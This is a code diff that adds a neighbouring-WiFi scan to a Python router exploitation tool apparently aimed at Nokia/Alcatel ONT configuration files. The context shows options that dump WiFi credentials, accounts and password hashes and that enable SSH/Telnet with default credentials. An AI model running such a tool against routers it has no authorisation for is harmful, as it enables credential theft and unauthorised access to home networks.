@@ -846,6 +846,111 @@ class Nanokia:
         except Exception as e:
             self.log(f"Error extracting password hashes: {e}", Colors.RED, "[ERROR]")
     
+    def dump_neighboring_wifi(self, xml_file):
+        self.log("Scanning for neighboring WiFi networks...", Colors.YELLOW)
+        
+        try:
+            with open(xml_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            neighbor_section = re.search(r'<X_ALU-COM_NeighboringWiFiDiagnostic\..*?</X_ALU-COM_NeighboringWiFiDiagnostic\.>', content, re.DOTALL)
+            
+            if not neighbor_section:
+                self.log("No neighboring WiFi diagnostic data found", Colors.YELLOW, "[INFO]")
+                return
+            
+            result_pattern = r'<Result\.\d+\..*?</Result\.\d+\.>'
+            results = re.findall(result_pattern, neighbor_section.group(0), re.DOTALL)
+            
+            if not results:
+                self.log("No neighboring WiFi networks found", Colors.YELLOW, "[INFO]")
+                return
+            
+            print("\n" + "="*100)
+            print(f"{Colors.GREEN}{'NEIGHBORING WiFi NETWORKS DETECTED BY ROUTER':^100}{Colors.RESET}")
+            print("="*100)
+            print(f"{Colors.CYAN}{'#':<4} {'SSID':<25} {'BSSID':<18} {'Ch':<4} {'Band':<6} {'Signal':<8} {'Security':<12} {'Mode':<8}{Colors.RESET}")
+            print("-"*100)
+            
+            wifi_count = 0
+            for i, result in enumerate(results, 1):
+                ssid_match = re.search(r'<SSID[^>]*v="([^"]+)"', result)
+                ssid = ssid_match.group(1) if ssid_match and ssid_match.group(1) else "Hidden"
+                
+                if not ssid or ssid in ["", "N/A"]:
+                    ssid = "Hidden"
+                
+                bssid_match = re.search(r'<BSSID[^>]*v="([^"]+)"', result)
+                bssid = bssid_match.group(1) if bssid_match else "N/A"
+                
+                channel_match = re.search(r'<Channel[^>]*v="(\d+)"', result)
+                channel = channel_match.group(1) if channel_match else "?"
+                
+                signal_match = re.search(r'<SignalStrength[^>]*v="(-?\d+)"', result)
+                signal = signal_match.group(1) if signal_match else "?"
+                signal_display = f"{signal} dBm"
+                
+                band_match = re.search(r'<OperatingFrequencyBand[^>]*v="([^"]+)"', result)
+                band = band_match.group(1) if band_match else "?"
+                
+                security_match = re.search(r'<SecurityModeEnabled[^>]*v="([^"]+)"', result)
+                security = security_match.group(1) if security_match else "Open"
+                
+                encryption_match = re.search(r'<EncryptionMode[^>]*v="([^"]+)"', result)
+                encryption = encryption_match.group(1) if encryption_match else ""
+                if encryption:
+                    security = f"{security}/{encryption}"
+                
+                standard_match = re.search(r'<OperatingStandards[^>]*v="([^"]+)"', result)
+                standard = standard_match.group(1) if standard_match else "?"
+                
+                wifi_count += 1
+                
+                signal_int = int(signal) if signal.lstrip('-').isdigit() else -100
+                if signal_int > -50:
+                    signal_color = f"{Colors.GREEN}{signal_display}{Colors.RESET}"
+                elif signal_int > -70:
+                    signal_color = f"{Colors.YELLOW}{signal_display}{Colors.RESET}"
+                else:
+                    signal_color = f"{Colors.RED}{signal_display}{Colors.RESET}"
+                
+                print(f"{wifi_count:<4} {ssid:<25} {bssid:<18} {channel:<4} {band:<6} {signal_color:<16} {security:<12} {standard:<8}")
+            
+            print("="*100)
+            
+            num_entries_match = re.search(r'<ResultNumberOfEntries[^>]*v="(\d+)"', neighbor_section.group(0))
+            total_entries = num_entries_match.group(1) if num_entries_match else wifi_count
+            
+            self.log(f"Found {wifi_count} neighboring WiFi network(s) (Total entries: {total_entries})", Colors.GREEN, "[+]")
+            
+            print(f"\n{Colors.CYAN}Additional Details:{Colors.RESET}")
+            for i, result in enumerate(results[:5], 1):
+                ssid_match = re.search(r'<SSID[^>]*v="([^"]+)"', result)
+                ssid = ssid_match.group(1) if ssid_match and ssid_match.group(1) else "Hidden"
+                
+                bandwidth_match = re.search(r'<OperatingChannelBandwidth[^>]*v="([^"]+)"', result)
+                bandwidth = bandwidth_match.group(1) if bandwidth_match else "N/A"
+                
+                bitrate_match = re.search(r'<MaxBitRate[^>]*v="(\d+)"', result)
+                bitrate = bitrate_match.group(1) if bitrate_match else "N/A"
+                
+                supported_match = re.search(r'<SupportedStandards[^>]*v="([^"]+)"', result)
+                supported = supported_match.group(1) if supported_match else "N/A"
+                
+                print(f"\n  {Colors.YELLOW}[{i}] {ssid}{Colors.RESET}")
+                print(f"      Bandwidth: {bandwidth}, Max Bitrate: {bitrate} Mbps")
+                print(f"      Supported: {supported}")
+            
+            if len(results) > 5:
+                print(f"\n  {Colors.CYAN}... and {len(results) - 5} more networks{Colors.RESET}")
+            
+            print()
+            
+        except FileNotFoundError:
+            self.log(f"Config file not found: {xml_file}", Colors.RED, "[ERROR]")
+        except Exception as e:
+            self.log(f"Error scanning neighboring WiFi: {e}", Colors.RED, "[ERROR]")
+    
     def modify_config(self, xml_file, ssh_username="ONTUSER", ssh_password="admin"):
         self.log("Modifying configuration to enable SSH/Telnet...", Colors.YELLOW)
         
@@ -1323,8 +1428,9 @@ def show_menu():
     print(f"{Colors.GREEN}[5]{Colors.RESET}  Show System Information")
     print(f"{Colors.GREEN}[6]{Colors.RESET}  Dump TR-069 Configuration")
     print(f"{Colors.GREEN}[7]{Colors.RESET}  Extract Password Hashes")
-    print(f"{Colors.GREEN}[8]{Colors.RESET}  Full Information Dump (All Above)")
-    print(f"{Colors.GREEN}[9]{Colors.RESET}  Enable SSH/Telnet Access")
+    print(f"{Colors.GREEN}[8]{Colors.RESET}  Scan Neighboring WiFi Networks")
+    print(f"{Colors.GREEN}[9]{Colors.RESET}  Full Information Dump (All Above)")
+    print(f"{Colors.GREEN}[10]{Colors.RESET} Enable SSH/Telnet Access")
     print(f"{Colors.RED}[0]{Colors.RESET}  Exit\n")
 
 def main():
@@ -1395,6 +1501,11 @@ def main():
         help='Extract password hashes'
     )
     parser.add_argument(
+        '--scan-wifi',
+        action='store_true',
+        help='Scan neighboring WiFi networks'
+    )
+    parser.add_argument(
         '--full-dump',
         action='store_true',
         help='Full information dump (all above)'
@@ -1425,6 +1536,7 @@ def main():
         args.system_info,
         args.dump_tr069,
         args.dump_hashes,
+        args.scan_wifi,
         args.full_dump,
         args.enable_ssh
     ])
@@ -1482,12 +1594,16 @@ def main():
         if args.dump_hashes:
             exploit.dump_password_hashes(xml_file)
         
+        if args.scan_wifi:
+            exploit.dump_neighboring_wifi(xml_file)
+        
         if args.full_dump:
             exploit.get_system_info(xml_file)
             exploit.dump_wifi_credentials(xml_file)
             exploit.dump_all_accounts(xml_file)
             exploit.dump_tr069_config(xml_file)
             exploit.dump_password_hashes(xml_file)
+            exploit.dump_neighboring_wifi(xml_file)
             exploit.list_devices(xml_file)
         
         if args.enable_ssh:
@@ -1524,13 +1640,13 @@ def main():
     while True:
 
         show_menu()
-        choice = input(f"{Colors.CYAN}[?] Select option [0-9]: {Colors.RESET}").strip()
+        choice = input(f"{Colors.CYAN}[?] Select option [0-10]: {Colors.RESET}").strip()
         
         if choice == '0':
             print(f"{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
             return 0
         
-        if choice not in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
+        if choice not in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
             print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
             continue
         
@@ -1593,19 +1709,21 @@ def main():
             exploit.dump_tr069_config(xml_file)
         
         elif choice == '7':
-
             exploit.dump_password_hashes(xml_file)
         
         elif choice == '8':
-
+            exploit.dump_neighboring_wifi(xml_file)
+        
+        elif choice == '9':
             exploit.get_system_info(xml_file)
             exploit.dump_wifi_credentials(xml_file)
             exploit.dump_all_accounts(xml_file)
             exploit.dump_tr069_config(xml_file)
             exploit.dump_password_hashes(xml_file)
+            exploit.dump_neighboring_wifi(xml_file)
             exploit.list_devices(xml_file)
         
-        elif choice == '9':
+        elif choice == '10':
 
             ssh_user = input(f"{Colors.CYAN}[?] SSH username (default: ONTUSER): {Colors.RESET}").strip() or "ONTUSER"
             ssh_pass = input(f"{Colors.CYAN}[?] SSH password (default: admin): {Colors.RESET}").strip() or "admin"
